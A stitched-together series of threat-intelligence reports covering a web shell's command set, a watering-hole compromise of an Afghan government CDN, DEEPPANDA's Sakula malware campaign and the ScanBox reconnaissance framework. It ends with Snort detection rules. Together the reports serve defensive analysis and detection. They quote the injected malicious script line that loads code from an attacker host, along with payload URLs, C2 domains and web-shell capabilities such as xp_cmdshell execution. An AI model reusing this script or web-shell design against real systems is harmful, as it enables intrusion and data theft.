If the field is left empty , the code will assume a valid path to a file on the local machine and will read and display contents to user .
Data Source= the code will assume that the unlabeled textbox2 contains a valid SQL query and will execute it and display the results .
http : // If this appears in unlabeled textbox1 , download content from the assumed URL .
$ SEX – If this appears in unlabeled textbox1 , pass the contents to the Server.Execute ( ) method .
BF .
Execute contents in unlabeled textbox1 as a SQL query and return binary data to adversary .
GF .
Execute contents in unlabeled textbox1 as a SQL statement and return valid textual data to adversary .
TF .
Upload the file chosen by the Choose File button and save it to a temporary table in the database file worktbl in chunks of 10240 bytes .
Then executes xp_cmdshell ( which executes the Bulk Copy Program ) to copy the data from that table to a file whose name is specified in unlabeled textbox2 .
After the file is saved , the code deletes the temporary table .
RF .
If unlabeled textbox1 is a local file on infected system , the file is read and displayed to attacker .
\\ If unlabeled textbox1 starts with \\ , use xp_cmdshell to execute the copy command to copy file to % windir % \Temp\temp.bin .
Then , issue the dir command and display results to user .
Finally , delete the temporary file % windir % \Temp\temp.bin .
DIR .
Perform Active Directory queries .
The code handles create , delete , set , get , and enum queries , while any query not matching those is executed directly .
All commands are executed using the System.DirectoryServices API .
Eva .
Simple wrapper around the CSharpCodeProvider API , allowing the adversary to compile and execute arbitrary C # source code .
Login Checkbox Attempt to use the username , password , and domain from the User , Pass and Domain fields and LogonUserA ( ) Win32 API function to impersonate a specific user .
Detatch Checkbox Specifies whether commands run from the Exec button will have their output redirected and displayed to the adversary when the command is finished executing .
In short , system_web.aspx provides an adversary with a very stealthy means of near full control of the server on which it resides .
This stealth might be its most important attribute .
As we will see , identifying web shells can be much harder than finding malicious binaries .
In our next post , we will discuss techniques for identifying web shells .
Stay tuned for Parts 2-4 as we cover File Stacking , Web Log Review , and Network Detection .
In the meantime , register now for the April 1st CrowdCast .
Operation Poisoned Helmand .
In this day and age of interconnected cloud services and distributed content delivery networks ( CDNs ) , it is important for both CDN service providers and security professionals alike to recognize and understand the risks that these systems can introduce within an modern enterprise .
For organizations within both public and private sectors that leverage CDN platforms to dynamically deliver web content , it is important that the content is also routinely monitored .
Otherwise , malicious third-party content can be loaded into a target organization ’ s website without their knowledge , delivering untold risks to unwitting visitors .
Afghan Government “ Watering Hole ” .
The ThreatConnect Intelligence Research Team ( TCIRT ) recently observed a targeted cross-site scripting ( XSS ) “ drive-by ” attack that leveraged a single content delivery network resource to distribute a malicious Java applet via nearly all of the major official Government of Afghanistan websites .
The compromised CDN resource in question is a JavaScript file hosted at http://cdn.afghanistan.af/scripts/gop-script.js .
The domain cdn.afghanistan.af is a legitimate CDN site used by the Afghan Ministry of Communications and IT ( MCIT ) to host web content that is displayed and used on many official gov.af websites .
The javascript URL ( http://cdn.afghanistan.af/scripts/gop-script.js ) is called from numerous official Afghan Government websites , including the following :
http : //canberra.afghanistan.af/en ( Afghan Embassy in Canberra , Australia ) http : //herat.gov.af/fa ( Herat Province Regional Government ) http : //mfa.gov.af/en ( Ministry of Foreign Affairs ) http : //moci.gov.af/en ( Ministry of Commerce and Industries ) http : //moe.gov.af/en ( Ministry of Education ) http : //mof.gov.af/en ( Ministry of Finance ) http : //moj.gov.af/fa ( Ministry of Justice ) http : //mowa.gov.af/fa ( Ministry of Women ’ s Affairs ) http : //oaacoms.gov.af/fa ( Office of Administrative Affairs and Council of Ministers ) .
It is likely that this javascript URL itself is normally legitimate , but the attackers obtained access to the file and prepended the following malicious JavaScript functions to the beginning of the script :
document.write ( `` < script src= http://update.javaplug-in.com/o/j.js > < \/script > '' ) ; document.write ( `` < script src= http:s > < \/script > '' ) ;
Note that the gov.af websites would not need to be compromised individually for this attack to be delivered to visitors of the sites , because it is the backend CDN infrastructure that is serving up the malicious script .
Li Keqiang : A Harbinger of Targeted Exploitation ?
Judging by the last modified timestamp on the HTTP response of gop-script.js , which is Tue , 16 Dec 2014 08:07:06 GMT , this malicious CDN compromise was very recent in nature .
In fact , it occurred on the very same day that China ’ s Prime Minister Li Keqiang would meet with Abdullah Abdullah , the Chief Executive Officer of Afghanistan in Astana Kazakhstan , they would discuss infrastructure development and bilateral cooperation issues .
Looking at the EXIF metadata of the image of Keqiang meeting with Abdullah that is hosted on the Chinese embassy website we note a Tue , 16 December 2014 07:43:31 modify time as well as the www.news.cn watermark in the bottom righthand corner .
This indicates that the image of Keqiang and Abdullah was likely taken and edited sometime prior to 07:43:31 .
While it is ambiguous as to which timezone the edits actually took place in ( Kazakhstan or China ) we assume the date timestamp references GMT because the press release states “ In the afternoon of December 15 local time… ” If we assume the photograph and afternoon meeting took place sometime prior to 13:43 Alma-Ata standard time ( +0600 ) this would closely correspond with a 07:43 GMT time stamp .
The modification of the gop-script.js by the attackers at 08:07:06 GMT likely tracks extremely close to a window of a few hours in which Keqiang met with Abdullah .
It is worth mentioning that a similar scenario occurred on June 20th when security researcher PhysicalDrive0 observed a malicious Java file hosted on the Embassy of Greece in Beijing .
At the time , a Chinese delegation led by Keqiang was visiting Greek Prime Minister Antonis Samaras in Athens .
Security researcher R136a1 aka “ thegoldenmessenger ” released a followup blog with detailed analysis of the Greek embassy compromise .
While these two separate events are not directly related , additional research into the status of ministerial and official government websites on or around the dates of notable Chinese delegations and or bilateral meetings may yield additional patterns of interest .
Java Malware Overlap .
Upon closer inspection of the prepended malicious JavaScript code , one will notice the similarity in the update.javaplug-in.com naming convention and URL structure to the C2 domain java-se.com found in the Palo Alto Networks blog post Attacks on East Asia using Google Code for Command and Control and associated with Operation Poisoned Hurricane .
However , the malicious document.write driveby URLs listed above both result in 403 Forbidden errors as of December 18 , 2014 .
While the 403 Forbidden errors may seem like an analytic dead end , the TCIRT also identified a malicious Java applet submission to VirusTotal that confirms the nature of this malicious activity .
This Java applet , SHA1 : 388E6F41462774268491D1F121F333618C6A2C9A , has no antivirus detections as of December 21st .
The applet contains its malicious class file at the path “ jre7u61windows/x86/Update.class ” .
This class file downloads and decodes an XOR 0xC8 encoded Windows PE executable payload from http://mfa.gov.af/content/images/icon35.png , hosted on the official Afghan Ministry of Foreign Affairs site , which was also affected by the gop-script XSS .
Using historic context archived within ThreatConnect , the TCIRT concluded that this Java applet is from the same source code as the applet SHA1 : ADC162DD909283097E72FC50B7AB0E04AB8A2BCC , which was previously observed by the TCIRT at the Operation Poisoned Hurricane related URL http://jre7.java-se.com/java.jar on August 15 , 2014 .
This applet has the same class path , and downloads an XOR 0xFF encoded payload executable from the URL http://amco-triton.co.jp/js/dl/in.jpg .
Additional indicators and context associated with this particular Java driveby activity can be found in the ThreatConnect Common Community Incident 20140815A :
java-se APT Driveby ( shared October 02 , 2014 ) .
The Windows PE Payload .
The XOR 0xC8 encoded payload downloaded from http://mfa.gov.af/content/images/icon35.png decodes into the Windows PE executable SHA1 :
72D72DC1BBA4C5EBC3D6E02F7B446114A3C58EAB .
This executable is a self-extracting ( SFX ) Microsoft Cabinet executable that is digitally signed with a valid certificate from “ OnAndOn Information System Co. , Ltd. ” , serial number “ 1F F7 D8 64 18 1C 55 5E 70 CF DD 3A 59 34 C4 7D ” .
This same certificate was also used to sign the Java applet that downloaded this malware .
This executable drops the following files :
SHA1 : 2068260601D60F07829EE0CEDF5A9C636CDB1765 ( dllhost.exe ) Legitimate Microsoft Debugging Tools for Windows Executable , loads dbgeng.dll SHA1 : E2D93ABC4C5EDE41CAF1C0D751A329B884D732A2 ( dbgeng.dll ) .
Malicious DLL that loads into the above dllhost.exe , using a similar DLL sideloading technique to that most commonly associated with the PlugX backdoor .
SHA1 : 5C8683E3523C7FA81A0166D7D127616B06334E8D ( Readme.txt ) Malicious encrypted backdoor binary blob loaded by dbgeng.dll .
This backdoor connects to the faux Oracle Java themed command and control ( C2 ) domain oracle0876634.javaplug-in.com .
Note that javaplug-in.com is the same root domain found in the compromised version of http://cdn.afghanistan.af/scripts/gop-script.js as http://update.javaplug-in.com/o/j.js , confirming that this Java malware is in fact directly associated with the Afghan MCIT CDN XSS compromise .
Full indicators of this activity and a YARA rule to detect the malware certificate can be found in the ThreatConnect Common Community under Incident 20141217A : Afghan Government Java Driveby and signature APT_OnAndOn_cert.yara .
Conclusion .
As the US and NATO reduce their troop levels in Afghanistan , China is posturing to fill the gap of influence that the west is leaving behind .
With plans to facilitate multilateral peace talks with the Taliban and establish major transportation projects which aim to bolster the Afghan economy , Beijing has been eyeing Afghanistan as part of its broader South Asian strategy .
By exploiting and co-opting Afghan network infrastructure that is used by multiple ministerial level websites , Chinese intelligence services would be able to widely distribute malicious payloads to a variety of global targets using Afghanistan ’ s government websites as a topical and trusted distribution platform , exploiting a single hidden entry point .
This being a variant of a typical “ watering-hole ” attack , the attackers will most likely infect victims outside the Afghan government who happened to be browsing any one of the CDN client systems , specifically , partner states involved in the planned troop reduction .
It is important to consider that corporate enterprises are not immune to this tactic , and this is not just a technique that is used by APT threat actors .
If an enterprise ’ s website leverages a CDN to speed up content delivery , unintended consequences must be anticipated .
Fortunately , modern browsers now implement a security concept called “ Content Security Policy ” .
As long as the server ’ s response headers are configured properly , third party content may be restricted to originating from a narrow whitelist .
Just as attackers distribute malicious content to users en masse or CDN services distribute web content to users , security professionals must be able to quickly distribute actionable Threat Intelligence in formats readable by both humans and machines .
ThreatConnect is the industry ’ s first comprehensive Threat Intelligence Platform that enables enterprises to orchestrate the aggregation of Threat Intelligence from multiple sources , use integrated analytics and a robust API that gives enterprises the control to action their own Threat Intelligence , in the cloud and on premises .
Register for a free account now to view the Common Community shares and more .
I am Ironman : DEEPPANDA Uses Sakula Malware to Target Organizations in Multiple Sectors .
Over the last few months , the CrowdStrike Intelligence team has been tracking a campaign of highly targeted events focused on entities in the U.S .
Defense Industrial Base ( DIB ) , healthcare , government , and technology sectors .
This campaign infected victims with Sakula malware variants that were signed with stolen certificates .
Investigation into this activity led to associations with the adversary known to CrowdStrike as DEEPPANDA .
On 31 July 2014 , an executable was identified , which , at the time , was not detected by any anti-virus products .
When this file was executed , it caused the victim to view a website by using the ShellExecute ( ) API to open a URL .
The site ’ s domain name was meant to spoof that of a site set up to provide information on an alumni event for a U.S university .
This page requested that the visitor download an Adobe-related plugin in order to view the content .
The downloaded plugin file included a variant of Sakula malware .
[ 1 ] The Sakula malware in this campaign utilized the Dynamic Link Library ( DLL ) side-loading technique most commonly associated with PlugX activity .
In the aforementioned university-related incidents , a legitimate executable named MediaSoft.exe ( MD5 hash : d00b3169f45e74bb22a1cd684341b14a ) loaded a file named msi.dll ( MD5 hash : ae6f33f6cdc25dc4bda24b2bccff79fe ) , which , in turn , was used to load the Sakula executable ( MD5 hash : 0c2674c3a97c53082187d930efb645c2 ) .
This final executable was also signed with a certificate assigned to an organization called DTOPTOOLZ Co. , Ltd .
Command-and-Control ( C2 ) communications in this incident went directly to IP address 180.210.206.246 ; a sample GET request is below :
Further investigation revealed similar activity stretching back to at least April 2014 , when similar TTPs were used to target a healthcare organization and a U.S.-based IT company with high-profile clients in the defense sector .
Two other incidents were also identified in August 2014 targeting a company in the DIB and a Mongolian government entity .
All incidents in this campaign were similar in that they utilized malicious droppers masquerading as installers for legitimate software applications like Adobe Reader , Juniper VPN , and Microsoft ActiveX Control .
They display progress bars that make it appear as if the specified software is being updated or installed .
Example of Installer Progress Bar Displayed by Dropper .
In addition , the droppers all directed victims to login pages for services specific to the target organization like webmail , document sharing , or corporate VPN .
In all cases except one , the victims were directed to legitimate login pages .
The one exception was a case in which victims were sent to a login page hosted on a domain that spoofed that of the legitimate one .
It is unclear whether redirecting victims to these login pages was part of credential-collection activity or merely meant to deceive victims into believing that the activity was legitimate .
Example of a Login Page that Victims were Redirected to .
The campaign appeared to be over by the end of August , but a file was recently discovered that suggests it may be ongoing .
The intended target again appeared to be a Mongolian government entity , and the file masqueraded as an installer for Microsoft ActiveX software .
It dropped the side-loaded Sakula malware just like in the other incidents ; however , in this instance , the Sakula payload was signed with a certificate assigned to a different organization , Career Credit Co. , Ltd .
The malware used the domain www.xha-mster.com for C2 which was created in mid-September and is registered with the email address wendellom@yahoo.com and registrant name “ tonyy starke ” ( hence the name , Ironman-related title for this blog ) .
Below is a chart showing the relevant relationships to this DEEPPANDA campaign .
The bottom of the chart shows an infrastructure connection between an IP address ( 198.200.45.112 ) used this campaign and also used in recently observed DEEPPANDA activity .
Association with Recent Scanbox Activity .
In September 2014 , CrowdStrike Intelligence identified a malicious file signed with the DTOPTOOLZ Co. , Ltd .
certificate .
Analysis of this file revealed it to be Derusbi malware ( a favorite RAT of DEEPPANDA ) that used the domain vpn.foundationssl.com for its C2 .
At the time of discovery , CrowdStrike did not attribute the file to DEEPPANDA based on the malware alone , but the use of the DTOPTOOLZ certificate to sign a malware variant known to be heavily used by this adversary makes it likely that this signed Derusbi sample is also attributable to DEEPPANDA .
In a recent public report from PWC , another foundationssl.com domain was linked to activity involving the Strategic Web Compromise ( SWC ) framework more commonly known as Scanbox .
In that operation , the Scanbox code was placed on the website of a U.S.-based think tank and utilized the malicious domain , news.foundationssl.com .
The use of the two foundationssl.com subdomains suggests that the same adversary ( in this case DEEPPANDA ) was responsible for the signed Derusbi malware file and the think tank SWC activity .
Furthermore , CrowdStrike publicly reported on DEEPPANDA targeting of think tanks in July 2014 .
If you want to hear more about DEEPPANDA and their tradecraft or any of the other adversaries that CrowdStrike tracks , please contact : sales @ crowdstrike.com [ 1 ] In February 2014 , CrowdStrike publicly reported on a campaign that leveraged Sakula malware ( http : //www.crowdstrike.com/blog/french-connection-french-aerospace-focused-cve-2014-0322-attack shares-similarities-2012/index.html ) ; however , the Tactics , Techniques , and Procedures ( TTPs ) between that campaign and this recent one are different , suggesting two distinct adversaries are using the Sakula malware .
Share this .
Cyber Threat Operations .
Tactical Intelligence Bulletin ScanBox II Date : 2015-02-24 Contact : threatintelligence @ uk.pwc.com Reference : CTO-TIB-20150224-01A TLP : WHITEuk.pwc.comIntelligence Bulletin ScanBox II Date : 2015-02-24 Contact : threatintelligence @ uk.pwc.com Reference : CTO-TIB-20150224-01A TLP : WHITE .
Tactical Intelligence Bulletin – TLP : WHITE .
1 .
A deeper look into ScanBox .
Please e-mail us at threatintelligence @ uk.pwc.com for a version of this report with additional indicators that you are welcome to distribute so long as it is not on public channels ( TLP-GREEN ) uk.pwc.commail us at threatintelligence @ uk.pwc.com for a version of this report with additional indicators that you are welcome to distribute so long as it is not on public channels ( TLP-GREEN ) .
We have observed actors amending the ScanBox framework to evade existing public signatures , detailed below .
Overview .
Security researchers have often made the mistake of assuming that when a specific tool was observed being used in espionage attacks , it was representative of activity of a single actor .
More frequently , however , many are now identifying that distinct groups of attackers are sharing their toolsets , just as in the cybercrime world .
One such toolset , the ScanBox framework , is now shared between a number of groups who conduct espionage attacks .
Evidence suggests that these groups include those behind the recent Forbes and Anthem attacks .
This short paper outlines our current perspectives on the previously discussed espionage groups currently using the framework and a hint that a 5th player is getting in on the game .
ScanBox performs keylogging of users when they visit a compromised website , without requiring malware to be deployed , and can collect a great deal of information which can be used to tailor future attacks In October we published some details of the ScanBox tool set .
Since then we have encountered 24 additional sites compromised with the framework .
Over this time we have observed changes to the code and novel techniques for executing .
We have also received a number of tip offs from other researchers , as well as queries from victims who were directly targeted by those using the framework .
We would like to extend our thanks to these individuals for their contributions towards this research .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
Who ’ s using it , and who ’ s being targeted ?
The following diagram shows the links in tools and targets between the groups discussed in our previous blog , but newer information has since come to light which allows us to more accurately associate these groups with known threat actors : Between these clusters , we ’ ve seen strategic web compromises designed to target users in the following countries :
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
Variations on the framework .
Since our last post there have been several alterations to the ScanBox code base , including new modules , changes to avoid signature based detection , as well as extra techniques to try to identify whether those being scanned are real machines or researchers .
Fears of proliferation .
In some cases we have been able to watch developers update and test variants of the framework , and even come across server-side code being tested by budding hackers .
Our findings are detailed below .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
2 .
Updates to the ScanBox Framework .
Following on from our previous post on ScanBox1 , we have watched the clusters of activity outlined with close interest , as well as keeping an eye on new adopters of the ScanBox framework .
For those who didn ’ t read our last entry on the framework , nor the excellent work by Jaime Blasco2 which preceded it , ScanBox is a framework written in JavaScript and PHP which allows an attacker to perform reconnaissance and key logging of visitors to compromised websites without requiring any malware to be downloaded or installed .
The framework has remained in use since initial analyses were published , and further analysis of the code , public reporting , as well as the infrastructure used to host ScanBox infections has given us a better picture of some of the clusters of activity we identified in our earlier blog .
Technical Updates .
In addition to the four websites we previously identified hosting the malicious code , we ’ ve now identified a further 24 websites hosting the framework .
Anonymised data relating the countries and sectors affected are given in appendix A .
Broadly , the ScanBox framework codebase has remained the same , however there are slight nuances in some aspects of the code , or in the software attackers choose to search for .
Software checks .
In cases where the attackers have included software checks within their ScanBox code , it tends to be for the same original list of filenames ( Appendix C ) .
In some cases the attackers customise the list , presumably based on the things they ’ re expecting to find .
For example , adding or removing additional security products based on the predominant software providers in their target region .
It ’ s also worth noting that the standard list includes quite a lot of software which is less relevant to security ( examples include WinRAR , iTunes and WinZip ) .
Some of these may be included in order to help the attackers to try and identify real victims vs researchers/sandboxes/honeypots .
An example list is shown in the following screenshot :
1 http : //pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it 1.html 2 https : //www.alienvault.com/open-threat-exchange/blog/scanbox-a-reconnaissance-framework-used-on-watering hole-attacks .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
checkDrives .
In one cluster of ScanBox activity , instead of checking for specific files as per the method above , the attackers have implemented a different method of tracking files and drives present on the victim machine .
The first piece of new functionality is that the attackers build a possible list of drive names ( A-Z ) and scan for the existence of each drive :
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
checkFolders .
They do not check files directly either , instead , checking for the presence of a list of folder names :
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
In this case , rather than determining what security software is present , this check would mainly be useful in assisting the attacker with identifying the victim ’ s operating system .
This could then be used to tailor future attacks ( i.e .
should I deploy malware which can bypass UAC ? Should I send malicious documents targeting CVE-2012-0158 or not ? ) .
Also , bizarrely the attackers check the path ‘ Program Files ( x80236 ) ’ – if anyone knows what this corresponds to , please get in touch and let us know .
Avoiding analysis ?
As we stated earlier , some of the features of the original ScanBox code were probably designed to help those analysing results distinguish between honeypots/analysis environments and real-world victims .
The newly added variables include :
 colorDepth – This may help to identify virtual machines which are typically configured with specific graphics options .
 Local Time on the machine – checking that the local time on the machine matches the expected time given the geo-location of the infected IP address – in many cases analysis environments are not configured with the correct time .
Updates to evade signatures Possibly in response to our previous report , we ’ ve seen some of the groups using ScanBox alter the content of the modules to evade detection .
Attackers do read reports , both to help them attack3 and also to evade detection .
One change has been the URI formats used to deliver stolen key log data from obvious URLs such as : /k.php ? data= [ KeyloggerData ] To more subtle URLs such as : / [ KeyloggerData ] .jpg We also note that following our release of a signature to detect the phrase “ No Java or Disable ” , which was present in a number of related frameworks , some of the attackers have now changed this to `` No or Disable '' .
3 For example as in http : //pwc.blogs.com/cyber_security_updates/2015/01/destructive-malware.html .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
3 .
Previously… on ScanBox… .
Clusters .
In our previous entry on ScanBox we described four clusters of activity – this section includes updates on those clusters .
Previously , we were only able to cluster activity based on the infrastructure used and the associated malware , we now have a sufficient number of samples to cluster based on differences in implementation between the code used for ScanBox in each case .
Flash Cluster ( aka Cluster 1 ) .
The recently published FBI flash alert # A-000049-MW4 , cited domain names previously referenced in our blog as being related to an actor known as Deep Panda , which we ’ ll get to in a minute .
The link appears to have been made from the use of the DerUsbi malware family though , which we know to be used by several espionage actors .
What is interesting is the potential overlap between the target selection of this cluster and the targets of those behind the recently reported Forbes compromise5,6 .
Checking the Google SafeBrowsing results for * . googlecaches.com , shows that the domain was used for distribution of malicious code for a significant period after our previous blog entry : This includes distribution via gokbayrak.com .
Looking at whether any other domains or IP addresses were observed delivering malicious software via gokbayrak.com shows that it was also observed delivering malware via 88.80.190.133 .
This is the same IP address that was cited in iSight ’ s reporting of the Forbes breach .
4 http : //krebsonsecurity.com/wp-content/uploads/2015/02/fbi-pandaflash.png 5 http : //www.invincea.com/2015/02/chinese-espionage-campaign-compromises-forbes/ 6 http : //www.isightpartners.com/2015/02/codoso/ .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
In fact , the IP address 88.80.190.133 was involved in the compromise of the same 3 websites as SafeBrowsing shows were affected by googlecaches.com .
The same three sites targeted with the 0-day used in the Forbes attack were also observed distributing malware via googlecaches.com we therefore believe it ’ s likely that the group we previously described as ‘ Cluster 1 ’ was behind the Forbes compromise .
We can use similar techniques to explore other actors who have the same tasking as Cluster 1 .
In the screenshot of websites delivering malware via gokbayrak.com , we saw that the domain name macanna.com.tw was also used to distribute malware from this page .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
Whilst macanna.com.tw appears to be a legitimate site , it has also been observed as being a command and control destination for malware .
The malware sample in question has a hash of 3b8d7732de3b3c8823d241e7cd3185c4 .
The same sample also communicates with happynewyear.dns04.com , which in turn resolves to the IP address 115.23.172.151 , which hosts a large number of other malicious host names :
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
These following hostnames are activity associated with the actor best known as TH3Bug7 named after their choice of Poison Ivy password .
Their malware samples are present in the same cluster :
7http : //researchcenter.paloaltonetworks.com/2014/09/recent-watering-hole-attacks-attributed-apt-group-th3bug using-poison-ivy/ .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
Deep Cluster ( aka Cluster 2 , centred on news.foundationssl.com ) .
This cluster relates to the threat actor referred to as Deep Panda by CrowdStrike , as was confirmed in a recent blog post8 .
In turn , this is widely believed to relate to the incident at Anthem , as described in a Krebs post9 .
The graph below shows the links between the we11point.com domain name , and news.foundationssl.com as seen on the CrowdStrike blogpost : The Krebs article also points toward other possible ( although not explicit ) links between the domain allegedly used in the Anthem hack ( we11point.com ) to Cluster 2 through shared WHOIS details , as we11point.com was registered by domain re-seller ‘ li2384826402@yahoo.com ’ On its own , this would not be sufficient to associate the two clusters , but it is useful to note as a ‘ softer ’ overlap .
8 blog.crowdstrike.com/ironman-deep-panda-uses-sakula-malware-target-organizations-multiple-sectors/ 9 http : //krebsonsecurity.com/2015/02/anthem-breach-may-have-started-in-april-2014/ .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
Mystery Cluster 3 ( aka Cluster 3 , centered on qoog1e.com ) :
Cluster 3 remains a mystery , unfortunately the code used in this instance is the most slim line version , and has since not been widely re-used – it is unclear who was behind the compromise using this domain name .
Evil Cluster ( aka Cluster 4 , centred on webmailgoogle.com ) :
We ’ d previously missed the link between Cluster 4 – and malware widely known as ‘ EvilGrab ’ or ‘ Vidgrab ’ .
From our view point , this malware is exclusively used by one group , known by CrowdStrike as Stone Panda10 .
In addition to the four clusters outlined above , within the 24 additional compromises identified , we believe there are at least 3 other distinct groups using the framework .
Digital Quartermastering .
In their 2013 paper ‘ From Quartermaster to Sunshop ’ 11 , FireEye described the concept of a Digital Quartermaster , a kind of malware supply chain for intrusions , where a skilled team would develop toolsets for a range of attackers who deploy them .
The shared use of ScanBox may match up quite well to this hypothesis , and indeed even to some extent the naming schema overlaps , as iSight refer to the actor behind the Forbes breach as Codoso , but suggest they are publically known as ‘ Sunshop ’ .
In all likelihood this relates to a series of blogs byFireEye which refer to a series of web compromises in 2013 as being the SunShop12 campaign .
Although we did not notice the correlation immediately , there is good overlap between the groups we ’ ve described above , and the clusters of activity described as sharing a Flash 0-day in early 2014 by Symantec13 .
Although other groups have since begun using the framework , the first groups to use the framework ( clusters 1-4 ) correspond quite nicely to the existing Symantec blog .
For reference , we ’ ve overlaid our ScanBox clusters against the likely clusters Symantec created behind the scenes for their blog , as well as other popular names :
ScanBox CrowdStrike Symantec Other Names Vulnerabilities & Malware Used Cluster Group Frameworks ScanBox Cluster 1 ? ? ? Sunshop ( iSight ) Briba , Poison Ivy CVE-2014-6332 ScanBox CVE-2014-0322 ( Internet Explorer ) Sakurel , DerUsbi , many Cluster 2 Deep Panda Sakurel CVE-2012-4792 ( Internet others Explorer ) CVE-2014-0502 ( Adobe Flash ) .
10 http : //www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem 11 https : //www.fireeye.com/content/dam/legacy/resources/pdfs/fireeye-malware-supply-chain.pdf 12 https : //www.fireeye.com/blog/threat-research/2013/05/ready-for-summer-the-sunshop-campaign.html 13 http : //www.symantec.com/connect/blogs/how-elderwood-platform-fueling-2014-s-zero-day-attacks .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
CVE-2014-1776 ( Internet Explorer ) ScanBox CVE-2014 Cluster 4 Stone Panda Vidgrab 0322 ( Internet Jolob/Vidgrab Explorer ) CVE-2014-0502 ( Adobe Flash ) .
Please note that each vendor has their own way of grouping activity together , so these mappings are given on a best efforts basis .
Player 5 has entered the game… .
In all examples of ScanBox deployments discussed so far , we believe that the scripts were deployed to anyone who visited websites of interest to a given sector which the attacker was able to compromise– and that the attackers waited for victims to visit the compromised site .
However one group of attackers using the ScanBox framework are now actively sending e-mails to potential victims , where the e-mails contain links to websites hosting ScanBox .
We believe these attackers are not covered by the existing clusters 1 through 4 , as the code differs from that used elsewhere .
This method of sending links rather than waiting for visiting a specific compromised website has two main advantages :
 The advantage that the attacker doesn ’ t have to compromise sites that are relevant to the sector they wish to perform reconnaissance against , so generally this will make things easier for the attacker ; and ,  The attacker has to deal with fewer false positives in terms of data received from victims .
Even good IP whitelisting techniques will result in some false positives , by controlling the visitors however they can ensure only those they want to scan are scanned .
This group differs from the others based on the following characteristics :
 They send e-mails with links to compromised websites , rather than compromising sites of interest to their targets .
Attackers send links to victims using a similar technique to that described in our Sofacy phishing blog14 , where multiple redirects are deployed , one being a decoy , the other in this case loading ScanBox :
14 http : //pwc.blogs.com/files/tactical-intelligence-bulletin -- -sofacy-phishing.pdf .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
 Uses the ‘ checkFolders ’ function within the ScanBox code , rather than explicitly checking for files ; and ,  Hosts the ScanBox code on the same page they have compromised rather than on a 3rd party IP address or domain name owned by the attacker .
So far we have identified four low key websites , all belonging to small companies based in the United States or Canada which are being abused in this fashion .
3.1 .
Going behind enemy lines – fears of proliferation and upcoming attacks .
At one point during our investigation into infrastructure hosting ScanBox code , we identified a server which appeared to be used for development and testing purposes .
On this occasion , the server side code was publicly accessible , allowing us to gain insights into the development and testing phase of an attack using ScanBox .
This also included the ScanBox framework ’ s own detailed reconnaissance against the developer themselves .
We noted the developer repeatedly uploading the modified versions to VirusTotal , presumably in an attempt to improve evasion of anti-virus .
We do not believe this developer is part of the core group that has access to the original implementation , but is instead another actor , who is likely rebuilding ScanBox from samples they find online .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
The screenshot on the left is from a version currently in development by a possible attacker , the corresponding screenshot on the right is from a public article15 .
15 http : //www.cnxhacker.com/2015/01/19/6412.html .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
4 .
Conclusion .
The publication of threat information allows us to draw links between different campaigns , tools and malware but we need to be careful about which links we consider to be significant and ensure we ’ re confident in how information that ’ s publically available was derived .
The summary above is just our view of the overlaps in web based tools/exploits and targets between different threat actors , but those with different datasets may be able to draw different conclusions .
Last time , we identified three possible hypotheses to explain the overlap between the ScanBox users , in this blog , based on the data we have available , we can settle on just one of these conclusions : “ 2 .
Selections of actors share some resources , as per previous observations with similar kits by some security vendors .
” Specifically , our key conclusions are :
 [ High Confidence ] The DQM theory presented by FireEye and later explored by Symantec in 2014 about likely tool and exploit sharing between a specific set of groups continues to hold true , we can only speculate as to the nature of the relationships organisationally between these groups .
 [ Medium Confidence ] We currently believe that the activity represented by Cluster 1 and the activity related to Th3Bug are distinct , but that there is overlap in who they are tasked to target .
 [ Low confidence ] – Th3Bug is one of the other actors who is in receipt of the same shared resource pool as those clusters already identified in this blog .
What is not clear is why specific resources ( web-based exploits ) appear to be shared , and why others ( primarily malware families ) are sometimes kept within a specific cluster .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
5 .
Signatures .
Snort Signatures – TLP WHITE alert tcp $ EXTERNAL_NET any > $ HOME_NET any ( msg : '' -- [ PwC CTD ] MultiGroup ScanBox and Targetted Watering Holes Content ( plugin_pdf_ie ( ) ) '' ; flow : established , from_server ; file_data ; content : '' plugin_pdf_ie ( ) '' ; classtype : trojan activity ; reference : url , pwc.blogs.com/cyber_security_updates/2014/10/scanbox framework-whos-affected-and-whos-using-it-1.html ; metadata : tlp WHITE , author CDD ; sid : xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET any > $ HOME_NET any ( msg : '' -- [ PwC CTD ] MultiGroup ScanBox Watering Hole Content ( .item ( 0 ) .appendChild ( iframe_tag ) ) '' ; flow : established , from_server ; file_data ; content : '' .item ( 0 ) .appendChild ( iframe_tag ) '' ; classtype : trojan-activity ; reference : url , pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos affected-and-whos-using-it-1.html ; metadata : tlp WHITE , author CDD ; sid : xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET any > $ HOME_NET any ( msg : '' -- [ PwC CTD ] MultiGroup ScanBox and Targetted Watering Holes Content ( var version\ ; var ax\ ; var e\ ; try { axo=new ActiveXObject ) '' ; flow : established , from_server ; file_data ; content : '' var version\ ; var ax\ ; var e\ ; try { axo=new ActiveXObject '' ; classtype : trojan-activity ; reference : url , pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos affected-and-whos-using-it-1.html ; metadata : tlp WHITE , author CDD ; sid : xxxxxx 